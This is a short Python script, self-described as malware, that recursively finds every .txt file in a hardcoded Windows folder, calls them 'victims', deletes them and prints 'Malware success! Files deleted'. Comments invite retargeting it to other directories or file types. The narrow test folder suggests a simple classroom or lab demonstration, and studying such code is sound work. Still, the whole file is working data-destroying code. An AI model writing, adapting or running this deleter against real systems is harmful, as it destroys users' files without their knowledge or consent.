# file deleter
import os

# list to store txt files
victims = []

def search_files():
    victims.clear()
    # alter path for chosen directory/subdirectories
    for root, dirs, files in os.walk(r"C:/Users/n10762710/Documents/filedeleter"):
        for file in files:
            # alter file type if desired
            if file.endswith(".txt"):
                victims.append(os.path.join(root, file))

    if len(victims) == 0:
        print('Malware success! Files deleted')
    else:
        print('Files within directory: ')
        print(victims)

def delete_files():
    for victim in victims:
        os.remove(victim)

    search_files()

if __name__ == "__main__":
    search_files()
    delete_files()

